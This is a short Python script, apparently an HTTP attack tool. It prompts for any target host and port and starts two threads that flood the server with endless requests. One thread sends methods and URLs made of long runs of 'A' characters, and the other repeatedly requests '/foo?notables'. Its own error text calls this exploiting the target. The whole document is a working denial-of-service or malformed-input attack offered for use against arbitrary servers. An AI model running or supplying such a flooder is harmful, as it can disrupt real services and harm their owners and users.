import http.client
import threading
import random

target = input('=> Target website/IP address : ')
targetPORT = int(input('=> Target port : '))

def connection_req(method, url):
    try:
        connection = http.client.HTTPConnection(target, targetPORT)
        connection.request(method, url)
        if "foo" in url:
            print(connection.getresponse().read())
        connection.close()
    except Exception:
        print("An exception occures. Unable to exploit the target.")
        pass

def req():
    action = "".join('A' for i in range(random.randint(0,1024)))
    while True:
        connection_req(action, action)

def module_threads():
    while True:
        connection_req("GET", "/foo?notables")

threading.Thread(target= module_threads).start()
threading.Thread(target=req).start()
